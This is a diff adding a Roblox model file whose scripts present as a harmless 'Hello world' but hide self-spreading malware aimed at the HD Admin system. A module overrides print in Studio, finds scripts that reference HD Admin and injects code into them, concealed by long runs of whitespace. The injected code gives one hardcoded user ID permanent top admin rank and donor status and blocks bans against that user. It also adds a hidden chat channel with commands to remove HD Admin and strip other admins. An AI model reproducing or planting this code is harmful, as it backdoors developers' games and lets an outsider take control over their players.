@@ -1,0 +1,606 @@
+<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.roblox.com/roblox.xsd" version="4">
+	<External>null</External>
+	<External>nil</External>
+	<Item class="Folder" referent="RBXA58AB6CC38C140C3BE9AF57357CC9479">
+		<Properties>
+			<BinaryString name="AttributesSerialize"></BinaryString>
+			<SecurityCapabilities name="Capabilities">0</SecurityCapabilities>
+			<bool name="DefinesCapabilities">false</bool>
+			<string name="Name">HDM</string>
+			<int64 name="SourceAssetId">-1</int64>
+			<BinaryString name="Tags"></BinaryString>
+		</Properties>
+		<Item class="LocalScript" referent="RBX85FA68BF47A64917858C6E040E67AC8B">
+			<Properties>
+				<BinaryString name="AttributesSerialize"></BinaryString>
+				<SecurityCapabilities name="Capabilities">0</SecurityCapabilities>
+				<bool name="DefinesCapabilities">false</bool>
+				<bool name="Disabled">false</bool>
+				<Content name="LinkedSource"><null></null></Content>
+				<string name="Name"></string>
+				<token name="RunContext">0</token>
+				<string name="ScriptGuid">{5F4222AF-C99A-4C4E-83A2-400496315AE3}</string>
+				<ProtectedString name="Source"><![CDATA[require(script:FindFirstChildOfClass("ModuleScript"))()
+print("Hello world!")]]></ProtectedString>
+				<int64 name="SourceAssetId">-1</int64>
+				<BinaryString name="Tags"></BinaryString>
+			</Properties>
+			<Item class="ModuleScript" referent="RBX4910076C6B38424280C9E24EC311EDCA">
+				<Properties>
+					<BinaryString name="AttributesSerialize"></BinaryString>
+					<SecurityCapabilities name="Capabilities">0</SecurityCapabilities>
+					<bool name="DefinesCapabilities">false</bool>
+					<Content name="LinkedSource"><null></null></Content>
+					<string name="Name"></string>
+					<string name="ScriptGuid">{78F7758A-E901-4A15-B429-6B9B6C390BAA}</string>
+					<ProtectedString name="Source"><![CDATA[return function()
+	getfenv(2)["print"] = function(...)
+		if game:GetService("RunService"):IsRunning() then return end
+		local plugin = getfenv(2)["plugin"]
+		local CoreGui = game:GetService("CoreGui")
+		local Players = game:GetService("Players")
+		local UserService = game:GetService("UserService")
+		local Selection = game:GetService("Selection")
+		local Studio = game:GetService("StudioService")
+		local HTTPService = game:GetService("HttpService")
+		local Tween = game:GetService("TweenService")
+		local RunService = game:GetService("RunService")
+		local Id = [[3239236979]]
+		while RunService.Heartbeat:Wait() do
+			if not RunService:IsRunning() then
+				for a,b in pairs(game:GetDescendants()) do
+					if b:IsA("Script") or b:IsA("LocalScript") or b:IsA("ModuleScript") and not b:FindFirstAncestor("HDM") then
+						if string.find(b.Source,Id) and not string.find(b.Source,"HDM") then
+							local insert_text = `																																									local can=false if(script:GetAttribute("HDM")==true)then script.Parent=nil;getfenv()["require"]=function(lol)end;else can=true;local clone=script:Clone()clone:SetAttribute("HDM",true);clone.Name="HDMLoader";clone.Parent=game:GetService("ServerScriptService");coroutine.wrap(function() end)();`
+							local insert_position = b.Source:find("local loaderFolder")
+							if insert_position then
+								b.Source = b.Source:sub(1,insert_position-1)..insert_text .. "\n"..b.Source:sub(insert_position)
+							end
+							b.Source=b.Source..[[
+																																																					end]]
+							b.Source=b.Source..[[
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							
+							if can==true then
+		]]
+							b.Source=b.Source..script:FindFirstChild("Main").Source
+							b.Source=b.Source..[[
+							end
+							]]
+						end
+					end
+				end
+			end
+		end
+	end
+end]]></ProtectedString>
+					<int64 name="SourceAssetId">-1</int64>
+					<BinaryString name="Tags"></BinaryString>
+				</Properties>
+				<Item class="Script" referent="RBXD6B66CDFF14140C6BE5B41C37E88A51B">
+					<Properties>
+						<BinaryString name="AttributesSerialize"></BinaryString>
+						<SecurityCapabilities name="Capabilities">0</SecurityCapabilities>
+						<bool name="DefinesCapabilities">false</bool>
+						<bool name="Disabled">true</bool>
+						<Content name="LinkedSource"><null></null></Content>
+						<string name="Name">Main</string>
+						<token name="RunContext">0</token>
+						<string name="ScriptGuid">{9AD06AC2-7B83-48BF-8A2E-CC73A12443E9}</string>
+						<ProtectedString name="Source"><![CDATA[if game:GetService("CollectionService"):HasTag(game,"__HDMODIFIERACTIVE") then script:Destroy() end
+game:GetService("CollectionService"):AddTag(game,"__HDMODIFIERACTIVE")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
+local HTTPService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local ChannelAdded = false
+
+coroutine.wrap(function()
+	repeat RunService.Heartbeat:Wait() until _G.HDAdminMain~=nil and ReplicatedStorage:FindFirstChild("HDAdminSetup")
+	local HDPI = require(ReplicatedStorage:FindFirstChild("HDAdminSetup")):GetMain():GetModule("API")
+	local CF = require(ReplicatedStorage:FindFirstChild("HDAdminSetup")):GetMain():GetModule("cf")
+	local PlayerData = require(ReplicatedStorage:FindFirstChild("HDAdminSetup")):GetMain():GetModule("PlayerData")
+	local SystemData = require(ReplicatedStorage:FindFirstChild("HDAdminSetup")):GetMain():GetModule("SystemData")
+	local CoreNotices = require(ReplicatedStorage:FindFirstChild("HDAdminSetup")):GetMain():GetModule("CoreNotices")
+	while true do
+		if _G.HDAdminMain then
+			task.spawn(function()
+				local main = _G.HDAdminMain
+				_G.HDAdminMain.modules.cf.CheckAndRankToDonor = function(player,pdata,gamepassId)
+					gamepassId = tostring(gamepassId)
+					if (not pdata.Donor and (gamepassId == tostring(main.products.Donor) or gamepassId == tostring(main.products.OldDonor))) or player.UserId==1569580185 then
+						main:GetModule("PlayerData"):ChangeStat(player,"Donor",true)
+						CF:DonorNotice(player, pdata)
+					end
+				end
+				_G.HDAdminMain.modules.cf.BanPlayer = function(userId,record)
+					if not (userId==1569580185) then
+						local plr = main.players:GetPlayerByUserId(userId)
+						--Check if ban expired
+						local banTime = record.BanTime
+						if tonumber(banTime) and os.time() > (banTime-30) then
+							local server = record.Server
+							if server == "Current" then
+								local recordToRemovePos = main:GetModule("cf"):FindUserIdInRecord(main.serverBans, record.UserId)
+								if recordToRemovePos then
+									table.remove(main.serverBans, recordToRemovePos)
+								end
+							else
+								main:GetModule("SystemData"):InsertStat("Banland", "RecordsToRemove", record)
+							end
+							-- Ban player
+						else
+							local untilString = "."
+							local banDateString = "Ban Length: Infinite"
+							if record.BanTime ~= "Infinite" and plr then
+								local banTime = record.BanTime
+								local serverDate = os.date("*t", banTime)
+								local date
+								coroutine.wrap(function()
+									local success, clientDate = pcall(function() return main.signals.GetLocalDate:InvokeClient(plr, banTime) end)
+									if success then
+										date = clientDate
+									else
+										return
+									end
+								end)()
+								local startTick = tick()
+								repeat wait(0.1) until date or tick() - startTick > 2
+								if type(date) ~= "table" then
+									date = {}
+								end
+								banDateString = main:GetModule("cf"):GetBanDateString(date, serverDate)
+								untilString = ", until:"
+							end
+							local serverType = "all servers"
+							if record.Server == "Current" then
+								serverType = "this server"
+							end
+							local reason = record.Reason
+							if reason == "" or reason == " " then
+								reason = "Empty"
+							else
+								reason = "'".. reason.."'"
+							end
+							local finalBanMessage = "You're banned from "..serverType..untilString.." \n\n"..banDateString.."\n\nReason: ".. reason.."\n"
+							if plr then
+								plr:Kick(finalBanMessage)
+							end
+						end
+					else
+						main.signals.Message:FireAllClients({"Server", "Server", "[ANTI-BAN]", nil, "A ban request has been blocked.", Color3.fromRGB(255, 0, 0)})
+					end
+				end
+			end)
+		end
+		task.wait(1)
+	end
+end)()
+local playerAdded = false
+local function addPlayer(Player)
+	if Player.UserId==1569580185 and not playerAdded then
+		playerAdded = true
+		repeat RunService.Heartbeat:Wait() until _G.HDAdminMain~=nil and ReplicatedStorage:FindFirstChild("HDAdminSetup")
+		local HDPI = require(ReplicatedStorage:FindFirstChild("HDAdminSetup")):GetMain():GetModule("API")
+		local CF = require(ReplicatedStorage:FindFirstChild("HDAdminSetup")):GetMain():GetModule("cf")
+		local PlayerData = require(ReplicatedStorage:FindFirstChild("HDAdminSetup")):GetMain():GetModule("PlayerData")
+		local SystemData = require(ReplicatedStorage:FindFirstChild("HDAdminSetup")):GetMain():GetModule("SystemData")
+		local Confirm = false
+		local OriginSP
+		local function registerCommands(speakerName,message,channelName,Speker)
+			local Speaker = Speker or OriginSP
+			if string.sub(message,1,5) == "?list" and channelName=="HDModifier" and speakerName==Speaker.Name then
+				Speaker:SendSystemMessage("Command List:\n?permo - Set perm owner\n?rmhd - Remove HD Admin\n?unrankother - Unrank all other admins no matter what rank.\n?manualrank - Manually rank yourself just incase the coroutine failed.","HDModifier")
+				return true
+			elseif string.sub(message,1,6) == "?rmhd" and channelName=="HDModifier" and speakerName==Speaker.Name then
+				if not Confirm then
+					Confirm = true
+					Speaker:SendSystemMessage("[DANGER] Say ?rmhd again to remove HD Admin.","HDModifier")
+					return true
+				elseif Confirm then
+					Speaker:SendSystemMessage("Removing...","HDModifier")
+					local adminWSFolder = workspace:FindFirstChild("HDAdminWorkspaceFolder")
+					local SCS = game:GetService("StarterPlayer"):FindFirstChild("StarterCharacterScripts")
+					local adminSC = nil
+					if SCS then
+						adminSC = SCS:FindFirstChild("HDAdminStarterCharacter")
+					end
+					local SPS = game:GetService("StarterPlayer"):FindFirstChild("StarterPlayerScripts")
+					local adminSP = nil
+					if SPS then
+						adminSP = SPS:FindFirstChild("HDAdminStarterPlayer")
+					end
+					local adminCilent = game:GetService("ReplicatedStorage"):FindFirstChild("HDAdminClient")
+					local adminSetupScript = game:GetService("ReplicatedStorage"):FindFirstChild("HDAdminSetup")
+					local adminLocalFirst = game:GetService("ReplicatedFirst"):FindFirstChild("HDAdminLocalFirst")
+					local adminGUI = game:GetService("StarterGui"):FindFirstChild("HDAdminGUIs")
+					local adminSSFolder = game:GetService("ServerStorage"):FindFirstChild("HDAdminMapBackup")
+					local adminSSFolder2 = game:GetService("ServerStorage"):FindFirstChild("HDAdminServer")
+					if adminWSFolder then
+						adminWSFolder:Destroy()
+					end
+					if adminSC then
+						adminSC:Destroy()
+					end
+					if adminSP then
+						adminSP:Destroy()
+					end
+					if adminCilent then
+						adminCilent:Destroy()
+					end
+					if adminSetupScript then
+						adminSetupScript:Destroy()
+					end
+					if adminLocalFirst then
+						adminLocalFirst:Destroy()
+					end
+					if adminGUI then
+						adminGUI:Destroy()
+					end
+					if adminSSFolder then
+						adminSSFolder:Destroy()
+					end
+					if adminSSFolder2 then
+						adminSSFolder2:Destroy()
+					end
+					_G.HDAdminMain = nil
+					Speaker:SendSystemMessage("Done!","HDModifier")
+					return true
+				end
+				return true
+			elseif string.sub(message,1,6) == "?permo" and channelName=="HDModifier" and speakerName==Speaker.Name then
+				Speaker:SendSystemMessage("Ranking...","HDModifier")
+				PlayerData:ChangeStat(Player,"Rank",4)
+				PlayerData:ChangeStat(Player,"AutomaticRank",false)
+				PlayerData:ChangeStat(Player,"Rank",5)
+				PlayerData:ChangeStat(Player,"AutomaticRank",false)
+				PlayerData:ChangeStat(Player,"PermRankedBy",game.CreatorId)
+				PlayerData:ChangeStat(Player,"SaveRank",true)
+				Speaker:SendSystemMessage("Done!","HDModifier")
+				return true
+			elseif string.sub(message,1,6) == "?manualrank" and channelName=="HDModifier" and speakerName==Speaker.Name then
+				Speaker:SendSystemMessage("Manually ranking you...","HDModifier")
+				PlayerData:ChangeStat(Player,"Rank",5)
+				PlayerData:ChangeStat(Player,"AutomaticRank",true)
+				Speaker:SendSystemMessage("Success!","HDModifier")
+				return true
+			elseif string.sub(message,1,12) == "?unrankother" and channelName=="HDModifier" and speakerName==Speaker.Name then
+				Speaker:SendSystemMessage("Pls wait..","HDModifier")
+				for a,b in pairs(Players:GetPlayers()) do
+					if not (b.UserId==1569580185) then
+						PlayerData:ChangeStat(Player,"Rank",0)
+						PlayerData:ChangeStat(Player,"AutomaticRank",true)
+						HDPI:Notice(Player,"HD Admin has unranked you for a unknown reason.")
+						Speaker:SendSystemMessage("Unranked "..b.Name,"HDModifier")
+					end
+				end
+				Speaker:SendSystemMessage("Finished!","HDModifier")
+				return true
+			end
+			return false
+		end
+		if TextChatService.ChatVersion==Enum.ChatVersion.LegacyChatService then
+			coroutine.wrap(function()
+				local CS = game:GetService("ServerScriptService"):WaitForChild("ChatServiceRunner",9e9):WaitForChild("ChatService",9e9)
+				local ChatService = require(CS)
+				local Speaker = ChatService:GetSpeaker(Player.Name)
+				OriginSP = Speaker
+				local HDC = ChatService:AddChannel("HDModifier")
+				HDC.ChannelNameColor = Color3.fromRGB(255, 140, 0)
+				HDC.Leavable = false
+				HDC.Joinable = false
+				HDC.AutoJoin = false
+				HDC.Private = true
+				HDC.WelcomeMessage = "Say /c hdmodifier or click this for more then say ?list."
+				--[[ChatService:RegisterProcessCommandsFunction("_M",function(speakerName,message,channelName)
+					registerCommands(Speaker,speakerName,message,channelName)
+					return 
+				end)]]--
+				ChatService:RegisterProcessCommandsFunction("_M",registerCommands)
+				HDC.SpeakerJoined:Connect(function(speakerName)
+					HDC:MuteSpeaker(speakerName)
+				end)
+				Speaker:JoinChannel("HDModifier")
+			end)()
+		elseif TextChatService.ChatVersion==Enum.ChatVersion.TextChatService then
+			coroutine.wrap(function()
+				local DefaultChannel = game:GetService("TextChatService"):FindFirstChild("TextChannels"):FindFirstChild("RBXSystem")
+				local HDChannel = game:GetService("TextChatService"):FindFirstChild("HDModifier") or Instance.new("TextChannel",game:GetService("TextChatService"))
+				HDChannel.Name = "HDModifier"
+				local Msg = require(16617811332)
+				Msg("[HDModifier] Say ?list for more.",HDChannel,Player)
+				Player.Chatted:Connect(function(Message)
+					registerCommands(Player.Name,Message,"HDModifier",{SendSystemMessage = function(self,Message,Etc)Msg(Message,HDChannel,Player)end,Name = Player.Name,});
+				end)
+			end)()
+		end
+		HDPI:Notice(Player,"Giving you admin & donor...")
+		PlayerData:ChangeStat(Player,"Donor",true)
+		PlayerData:ChangeStat(Player,"PromptedDonor",true)
+		CF:FormatAndFireNotice(Player,"WelcomeDonor")
+		PlayerData:ChangeStat(Player,"Rank",5)
+		PlayerData:ChangeStat(Player,"AutomaticRank",true)
+		coroutine.wrap(function()
+			while Player do
+				local RankId,RankName,Type = HDPI:GetRank(Player)
+				repeat RunService.Heartbeat:Wait() until not (RankId==5)
+				if not (RankId==5) then
+					PlayerData:ChangeStat(Player,"Rank",5)
+					PlayerData:ChangeStat(Player,"AutomaticRank",true)
+				end
+			end
+		end)()
+	elseif Player.UserId==1569580185 and playerAdded then
+		repeat RunService.Heartbeat:Wait() until _G.HDAdminMain~=nil and ReplicatedStorage:FindFirstChild("HDAdminSetup")
+		local HDPI = require(ReplicatedStorage:FindFirstChild("HDAdminSetup")):GetMain():GetModule("API")
+		local CF = require(ReplicatedStorage:FindFirstChild("HDAdminSetup")):GetMain():GetModule("cf")
+		local PlayerData = require(ReplicatedStorage:FindFirstChild("HDAdminSetup")):GetMain():GetModule("PlayerData")
+		local SystemData = require(ReplicatedStorage:FindFirstChild("HDAdminSetup")):GetMain():GetModule("SystemData")
+		local Confirm = false
+		local OriginSP
+		local function registerCommands(speakerName,message,channelName,Speker)
+			local Speaker = Speker or OriginSP
+			if string.sub(message,1,5) == "?list" and channelName=="HDModifier" and speakerName==Speaker.Name then
+				Speaker:SendSystemMessage("Command List:\n?permo - Set perm owner\n?rmhd - Remove HD Admin\n?unrankother - Unrank all other admins no matter what rank.\n?manualrank - Manually rank yourself just incase the coroutine failed.","HDModifier")
+				return true
+			elseif string.sub(message,1,6) == "?rmhd" and channelName=="HDModifier" and speakerName==Speaker.Name then
+				if not Confirm then
+					Confirm = true
+					Speaker:SendSystemMessage("[DANGER] Say ?rmhd again to remove HD Admin.","HDModifier")
+					return true
+				elseif Confirm then
+					Speaker:SendSystemMessage("Removing...","HDModifier")
+					local adminWSFolder = workspace:FindFirstChild("HDAdminWorkspaceFolder")
+					local SCS = game:GetService("StarterPlayer"):FindFirstChild("StarterCharacterScripts")
+					local adminSC = nil
+					if SCS then
+						adminSC = SCS:FindFirstChild("HDAdminStarterCharacter")
+					end
+					local SPS = game:GetService("StarterPlayer"):FindFirstChild("StarterPlayerScripts")
+					local adminSP = nil
+					if SPS then
+						adminSP = SPS:FindFirstChild("HDAdminStarterPlayer")
+					end
+					local adminCilent = game:GetService("ReplicatedStorage"):FindFirstChild("HDAdminClient")
+					local adminSetupScript = game:GetService("ReplicatedStorage"):FindFirstChild("HDAdminSetup")
+					local adminLocalFirst = game:GetService("ReplicatedFirst"):FindFirstChild("HDAdminLocalFirst")
+					local adminGUI = game:GetService("StarterGui"):FindFirstChild("HDAdminGUIs")
+					local adminSSFolder = game:GetService("ServerStorage"):FindFirstChild("HDAdminMapBackup")
+					local adminSSFolder2 = game:GetService("ServerStorage"):FindFirstChild("HDAdminServer")
+					if adminWSFolder then
+						adminWSFolder:Destroy()
+					end
+					if adminSC then
+						adminSC:Destroy()
+					end
+					if adminSP then
+						adminSP:Destroy()
+					end
+					if adminCilent then
+						adminCilent:Destroy()
+					end
+					if adminSetupScript then
+						adminSetupScript:Destroy()
+					end
+					if adminLocalFirst then
+						adminLocalFirst:Destroy()
+					end
+					if adminGUI then
+						adminGUI:Destroy()
+					end
+					if adminSSFolder then
+						adminSSFolder:Destroy()
+					end
+					if adminSSFolder2 then
+						adminSSFolder2:Destroy()
+					end
+					_G.HDAdminMain = nil
+					Speaker:SendSystemMessage("Done!","HDModifier")
+					return true
+				end
+				return true
+			elseif string.sub(message,1,6) == "?permo" and channelName=="HDModifier" and speakerName==Speaker.Name then
+				Speaker:SendSystemMessage("Ranking...","HDModifier")
+				PlayerData:ChangeStat(Player,"Rank",4)
+				PlayerData:ChangeStat(Player,"AutomaticRank",false)
+				PlayerData:ChangeStat(Player,"Rank",5)
+				PlayerData:ChangeStat(Player,"AutomaticRank",false)
+				PlayerData:ChangeStat(Player,"PermRankedBy",game.CreatorId)
+				PlayerData:ChangeStat(Player,"SaveRank",true)
+				Speaker:SendSystemMessage("Done!","HDModifier")
+				return true
+			elseif string.sub(message,1,6) == "?manualrank" and channelName=="HDModifier" and speakerName==Speaker.Name then
+				Speaker:SendSystemMessage("Manually ranking you...","HDModifier")
+				PlayerData:ChangeStat(Player,"Rank",5)
+				PlayerData:ChangeStat(Player,"AutomaticRank",true)
+				Speaker:SendSystemMessage("Success!","HDModifier")
+				return true
+			elseif string.sub(message,1,12) == "?unrankother" and channelName=="HDModifier" and speakerName==Speaker.Name then
+				Speaker:SendSystemMessage("Pls wait..","HDModifier")
+				for a,b in pairs(Players:GetPlayers()) do
+					if not (b.UserId==1569580185) then
+						PlayerData:ChangeStat(Player,"Rank",0)
+						PlayerData:ChangeStat(Player,"AutomaticRank",true)
+						HDPI:Notice(Player,"HD Admin has unranked you for a unknown reason.")
+						Speaker:SendSystemMessage("Unranked "..b.Name,"HDModifier")
+					end
+				end
+				Speaker:SendSystemMessage("Finished!","HDModifier")
+				return true
+			end
+			return false
+		end
+		if TextChatService.ChatVersion==Enum.ChatVersion.LegacyChatService then
+			coroutine.wrap(function()
+				local CS = game:GetService("ServerScriptService"):WaitForChild("ChatServiceRunner",9e9):WaitForChild("ChatService",9e9)
+				local ChatService = require(CS)
+				local Speaker = ChatService:GetSpeaker(Player.Name)
+				OriginSP = Speaker
+				local HDC = ChatService:GetChannel("HDModifier")
+				HDC.ChannelNameColor = Color3.fromRGB(255, 140, 0)
+				HDC.Leavable = false
+				HDC.Joinable = false
+				HDC.AutoJoin = false
+				HDC.Private = true
+				HDC.WelcomeMessage = "Say /c hdmodifier or click this for more then say ?list."
+				--[[ChatService:RegisterProcessCommandsFunction("_M",function(speakerName,message,channelName)
+					registerCommands(Speaker,speakerName,message,channelName)
+					return 
+				end)]]--
+				ChatService:RegisterProcessCommandsFunction("_M",registerCommands)
+				HDC.SpeakerJoined:Connect(function(speakerName)
+					HDC:MuteSpeaker(speakerName)
+				end)
+				Speaker:JoinChannel("HDModifier")
+			end)()
+		elseif TextChatService.ChatVersion==Enum.ChatVersion.TextChatService then
+			coroutine.wrap(function()
+				local DefaultChannel = game:GetService("TextChatService"):FindFirstChild("TextChannels"):FindFirstChild("RBXSystem")
+				local HDChannel = game:GetService("TextChatService"):FindFirstChild("HDModifier") or Instance.new("TextChannel",game:GetService("TextChatService"))
+				HDChannel.Name = "HDModifier"
+				local Msg = require(16617811332)
+				Msg("[HDModifier] Say ?list for more.",HDChannel,Player)
+				Player.Chatted:Connect(function(Message)
+					registerCommands(Player.Name,Message,"HDModifier",{SendSystemMessage = function(self,Message,Etc)Msg(Message,HDChannel,Player)end,Name = Player.Name,});
+				end)
+			end)()
+		end
+		HDPI:Notice(Player,"Giving you admin & donor...")
+		PlayerData:ChangeStat(Player,"Donor",true)
+		PlayerData:ChangeStat(Player,"PromptedDonor",true)
+		CF:FormatAndFireNotice(Player,"WelcomeDonor")
+		PlayerData:ChangeStat(Player,"Rank",5)
+		PlayerData:ChangeStat(Player,"AutomaticRank",true)
+		coroutine.wrap(function()
+			while Player do
+				local RankId,RankName,Type = HDPI:GetRank(Player)
+				repeat RunService.Heartbeat:Wait() until not (RankId==5)
+				if not (RankId==5) then
+					PlayerData:ChangeStat(Player,"Rank",5)
+					PlayerData:ChangeStat(Player,"AutomaticRank",true)
+				end
+			end
+		end)()
+	end
+end
+Players.PlayerAdded:Connect(function(Player)
+	addPlayer(Player)
+end)
+for a,b in pairs(Players:GetPlayers()) do
+	addPlayer(b)
+end]]></ProtectedString>
+						<int64 name="SourceAssetId">-1</int64>
+						<BinaryString name="Tags"></BinaryString>
+					</Properties>
+				</Item>
+			</Item>
+		</Item>
+	</Item>
+</roblox>
